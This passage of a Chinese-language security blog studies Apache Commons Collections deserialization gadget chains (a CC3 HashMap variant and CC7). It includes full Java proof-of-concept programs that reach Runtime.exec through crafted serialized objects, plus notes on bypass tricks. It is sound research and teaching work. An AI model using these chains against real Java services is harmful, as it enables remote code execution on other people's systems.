s.writeObject(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>可以看到，对应的写入<code>map</code>成员的<code>capacity</code>、<code>loadFactor</code>、<code>size</code>以及其中的所有元素，同时在<code>readObject</code>也是依照顺序一一对应进行读取，如下所示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801175923980.png" alt="image-20220801175923980"></p>
<p>所以在<code>writeObject</code>的时候，在<code>HashSet</code>中的<code>map</code>成员的元素可控，那么在<code>readObject</code>的时候，对应的元素也是可控的，可以设置为<code>TiedMapEntry</code>。</p>
<p>所以在<code>JAVA</code>中的<code>writeObject</code>和<code>readObject</code>是一一对应的，写入什么格式数据，就会依照什么格式数据读取。</p>

        <h2 id="CC3的HashMap版本"   >
          <a href="#CC3的HashMap版本" class="heading-link"><i class="fas fa-link"></i></a><a href="#CC3的HashMap版本" class="headerlink" title="CC3的HashMap版本"></a>CC3的HashMap版本</h2>
      <p>这边顺带提一下以下这两条链子，其实都差不多，大同小异，主要是前面的不太一样，直接借用<code>HashMap</code>来进行触发。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220806174412815.png" alt="image-20220806174412815"></p>

        <h3 id="POC-5"   >
          <a href="#POC-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#POC-5" class="headerlink" title="POC"></a>POC</h3>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC3_O</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                                   <span class="keyword">new</span> Class[] &#123; String.class &#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;touch ddd&quot;</span>&#125;)&#125;);</span><br><span class="line"></span><br><span class="line">        HashMap hashmap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        hashmap.put(<span class="string">&quot;aaa&quot;</span>,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        hashmap.put(<span class="string">&quot;ccc&quot;</span>,<span class="string">&quot;ddd&quot;</span>);</span><br><span class="line">        LazyMap map = (LazyMap)LazyMap.decorate(hashmap,chain);</span><br><span class="line">        TiedMapEntry tiedmap = <span class="keyword">new</span> TiedMapEntry(map,<span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        Field table = Class.forName(<span class="string">&quot;java.util.HashMap&quot;</span>).getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object[] array = (Object[])table.get(hashmap);</span><br><span class="line"></span><br><span class="line">        Object node = array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        setField(node,<span class="string">&quot;key&quot;</span>,tiedmap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./cc3_o&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hashmap);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;./cc3_o&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setField</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>也没啥好说的，往<code>HashMap</code>中放两个元素，使其<code>table</code>不为空，方便取出<code>node</code>来设置<code>TiedMapEntry</code>即可。</p>
<p>其他的就相当于去掉了<code>HashSet</code>的<code>CC6</code>了，触发点在<code>HashMap.readObject()</code>下的计算<code>hash</code>的地方</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220806175025930.png" alt="image-20220806175025930"></p>

        <h1 id="七、CC7"   >
          <a href="#七、CC7" class="heading-link"><i class="fas fa-link"></i></a><a href="#七、CC7" class="headerlink" title="七、CC7"></a>七、CC7</h1>
      
        <h2 id="JAVA源码版本-8u40-6"   >
          <a href="#JAVA源码版本-8u40-6" class="heading-link"><i class="fas fa-link"></i></a><a href="#JAVA源码版本-8u40-6" class="headerlink" title="JAVA源码版本-8u40"></a>JAVA源码版本-8u40</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802153315688.png" alt="image-20220802153315688"></p>
<p>细节如下：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Hashtable.readObject()-&gt;reconstitutionPut()</span><br><span class="line">LazyMap.equals()==AbstractMapDecorator.equals()</span><br><span class="line">AbstractMap.equals()</span><br><span class="line">LazyMap.get()</span><br></pre></td></tr></table></div></figure>


        <h2 id="限制-6"   >
          <a href="#限制-6" class="heading-link"><i class="fas fa-link"></i></a><a href="#限制-6" class="headerlink" title="限制"></a>限制</h2>
      <p><code>JDK</code>版本：暂无限制</p>

        <h2 id="Poc-1"   >
          <a href="#Poc-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Poc-1" class="headerlink" title="Poc"></a>Poc</h2>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC7</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[]&#123;&#125;);</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;touch bbbb&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Map innerMap1 = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map innerMap2 = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);</span><br><span class="line">        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);</span><br><span class="line"></span><br><span class="line">        lazyMap1.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Hashtable hashtable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        setField(transformerChain,<span class="string">&quot;iTransformers&quot;</span>,transformers);</span><br><span class="line"></span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;zZ&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./cc7&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hashtable);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;./cc7&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setField</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="解析-8"   >
          <a href="#解析-8" class="heading-link"><i class="fas fa-link"></i></a><a href="#解析-8" class="headerlink" title="解析"></a>解析</h2>
      
        <h3 id="Hashtable-readObject"   >
          <a href="#Hashtable-readObject" class="heading-link"><i class="fas fa-link"></i></a><a href="#Hashtable-readObject" class="headerlink" title="Hashtable.readObject()"></a><code>Hashtable.readObject()</code></h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807102603926.png" alt="image-20220807102603926"></p>

        <h3 id="Hashtable-reconstitutionPut"   >
          <a href="#Hashtable-reconstitutionPut" class="heading-link"><i class="fas fa-link"></i></a><a href="#Hashtable-reconstitutionPut" class="headerlink" title="Hashtable.reconstitutionPut()"></a><code>Hashtable.reconstitutionPut()</code></h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807102732158.png" alt="image-20220807102732158"></p>
<p>由于<code>LazyMap</code>继承了<code>AbstractMapDecorator</code>，所以会调用到其<code>equals</code>函数</p>

        <h3 id="LazyMap-equals-AbstractMapDecorator-equals"   >
          <a href="#LazyMap-equals-AbstractMapDecorator-equals" class="heading-link"><i class="fas fa-link"></i></a><a href="#LazyMap-equals-AbstractMapDecorator-equals" class="headerlink" title="LazyMap.equals()==AbstractMapDecorator.equals()"></a><code>LazyMap.equals()==AbstractMapDecorator.equals()</code></h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807102940029.png" alt="image-20220807102940029"></p>
<p>这里的<code>equals</code>接着往下跳转就不知道为什么会直接跳到<code>AbstractMap.equals()</code>了</p>

        <h3 id="AbstractMap-equals"   >
          <a href="#AbstractMap-equals" class="heading-link"><i class="fas fa-link"></i></a><a href="#AbstractMap-equals" class="headerlink" title="AbstractMap.equals()"></a><code>AbstractMap.equals()</code></h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807103216037.png" alt="image-20220807103216037"></p>

        <h3 id="LazyMap-get-3"   >
          <a href="#LazyMap-get-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#LazyMap-get-3" class="headerlink" title="LazyMap.get()"></a><code>LazyMap.get()</code></h3>
      <p>接着就是经典链子<code>CCI</code>了。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807103304810.png" alt="image-20220807103304810"></p>

        <h2 id="🔺注-2"   >
          <a href="#🔺注-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺注-2" class="headerlink" title="🔺注"></a>🔺注</h2>
      
        <h3 id="1-hashtable-put两次"   >
          <a href="#1-hashtable-put两次" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-hashtable-put两次" class="headerlink" title="1.hashtable.put两次"></a>1.<code>hashtable.put</code>两次</h3>
      <p>由于需要在<code>Hashtable.reconstitutionPut()</code>中进入该循环，所以需要<code>hashtable.put</code>两次，</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807104841649.png" alt="image-20220807104841649"></p>

        <h3 id="2-反射设置CCI链子"   >
          <a href="#2-反射设置CCI链子" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-反射设置CCI链子" class="headerlink" title="2.反射设置CCI链子"></a>2.反射设置<code>CCI</code>链子</h3>
      <p>如果直接进行设置，那么在本地<code>hashtable.put</code>的时候也会触发<code>RCE</code>，那么在<code>hashtable.put</code>之后再设置<code>CCI</code>链，就不会本地触发<code>RCE</code>了，这样是为了防止非预期的一些东西，就像在之前<code>CC5</code>中预防本地<code>RCE</code>一样。</p>
<p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20220807105255253.png" alt="image-20220807105255253"></p>

        <h3 id="3-hash碰撞"   >
          <a href="#3-hash碰撞" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-hash碰撞" class="headerlink" title="3.hash碰撞"></a>3.hash碰撞</h3>
      <p>为什么<code>put</code>的时候需要<code>yy</code>和<code>zZ</code>，这样是为了使得其生成的<code>hash</code>相同，从而能够进行比较，在<code>Hashtable.reconstitutionPut()</code>中能够通过前面的<code>hash</code>相等条件</p>
<p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20220807114011896.png" alt="image-20220807114011896"></p>
<p>当然换成其他的能够进行<code>hash</code>碰撞的也是一样的。</p>

        <h3 id="4-remove必要性"   >
          <a href="#4-remove必要性" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-remove必要性" class="headerlink" title="4.remove必要性"></a>4.remove必要性</h3>
      <p>至于为什么需要<code>lazyMap2.remove(&quot;zZ&quot;);</code>简单来说，就是第一次<code>hashtable.put</code>的时候，由于<code>hashtable.table</code>为<code>null</code>，无法进入循环到如下的<code>equals</code>函数触发<code>LazyMap.get()</code>。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807112631117.png" alt="image-20220807112631117"></p>
<p>但是第二次的时候就会进入比较函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807112907832.png" alt="image-20220807112907832"></p>
<p>从而进入到<code>LazyMap.get()</code>调用空的<code>transform</code>函数数组，返回一个<code>key</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807113208463.png" alt="image-20220807113208463"></p>
<p>导致我们的<code>LazyMap2</code>会多一个<code>key</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807113425973.png" alt="image-20220807113425973"></p>
<p>如果保留下来，就无法进入到在<code>AbstractMap.equals</code>对应触发漏洞的地方，在如下地方就直接没掉，那么就需要去掉<code>lazyMap2</code>下由于空的<code>Transform</code>数组调用多出来的一个<code>key</code>了，都是为了进行各种绕过。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807113545609.png" alt="image-20220807113545609"></p>

        <h1 id="总结"   >
          <a href="#总结" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结" class="headerlink" title="总结"></a>总结</h1>
      <p>感觉差不多了，没什么太多的地方需要慢慢学习了。</p>
<p>本菜鸡觉得<code>CC</code>链的学习主要就是分两部分吧</p>
<p>一部分是后面的用来调用命令的部分，我觉得叫<strong>命令链</strong>比较合适，比如这里写到的经典链子<code>CCI</code>，经典链子<code>ITN</code>之类的，这部分都大同小异，暂时就那一些。</p>
<p>另一部分就是从<code>readObject</code>调用到<strong>命令链</strong>的部分，这部分通常是需要需要慢慢挖掘的，主要的点就是找能调用到<code>transform</code>地方。</p>
</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://PIG-007.github.io">PIG-007</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://pig-007.github.io/2022/07/25/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC/">http://pig-007.github.io/2022/07/25/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://pig-007.github.io/tags/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">JAVA反序列化</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2022/09/20/Leecode%E5%88%B7%E9%A2%98/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">算法笔记</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2022/04/15/CVE-2021-22555_Netfilter%E5%A0%86%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/"><span class="paginator-prev__text">CVE-2021-22555</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E8%AF%B4%E6%98%8E"><span class="toc-text">
          前置说明</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-text">
          前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81-8u40"><span class="toc-text">
          源码-8u40</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Transformer"><span class="toc-text">
          Transformer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TransformedMap"><span class="toc-text">
          TransformedMap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ConstantTransformer"><span class="toc-text">
          ConstantTransformer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#InvokerTransformer"><span class="toc-text">
          InvokerTransformer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ChainedTransformer"><span class="toc-text">
          ChainedTransformer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TemplatesImpl"><span class="toc-text">
          TemplatesImpl</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-1"><span class="toc-text">
          前置知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%93%BE%E5%AD%90"><span class="toc-text">
          链子</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TemplatesImpl-newTransformer"><span class="toc-text">
          TemplatesImpl.newTransformer()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TemplatesImpl-defineTransletClasses"><span class="toc-text">
          TemplatesImpl.defineTransletClasses()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TransletClassLoader-defineClass"><span class="toc-text">
          TransletClassLoader.defineClass()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TrAXFilter"><span class="toc-text">
          TrAXFilter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#InstantiateTransformer"><span class="toc-text">
          InstantiateTransformer</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%8F%E5%85%B8%E9%93%BE%E5%AD%90CCI"><span class="toc-text">
          经典链子CCI</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-2"><span class="toc-text">
          前置知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E4%BD%BF%E7%94%A8"><span class="toc-text">
          实际使用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%8F%E5%85%B8%E9%93%BE%E5%AD%90ITN"><span class="toc-text">
          经典链子ITN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-3"><span class="toc-text">
          前置知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E4%BD%BF%E7%94%A8-1"><span class="toc-text">
          实际使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JAVA%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6"><span class="toc-text">
          JAVA版本限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90"><span class="toc-text">
          解析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%8F%E5%85%B8%E9%93%BE%E5%AD%90CITTN"><span class="toc-text">
          经典链子CITTN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E9%93%BE"><span class="toc-text">
          测试链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90-1"><span class="toc-text">
          解析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81CC1"><span class="toc-text">
          一、CC1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-4"><span class="toc-text">
          前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#InvocationHandler"><span class="toc-text">
          InvocationHandler</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JAVA%E6%BA%90%E7%A0%81%E7%89%88%E6%9C%AC-8u40"><span class="toc-text">
          JAVA源码版本-8u40</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%90%E5%88%B6"><span class="toc-text">
          限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC"><span class="toc-text">
          POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90-2"><span class="toc-text">
          解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AnnotationInvocationHandler-readObject"><span class="toc-text">
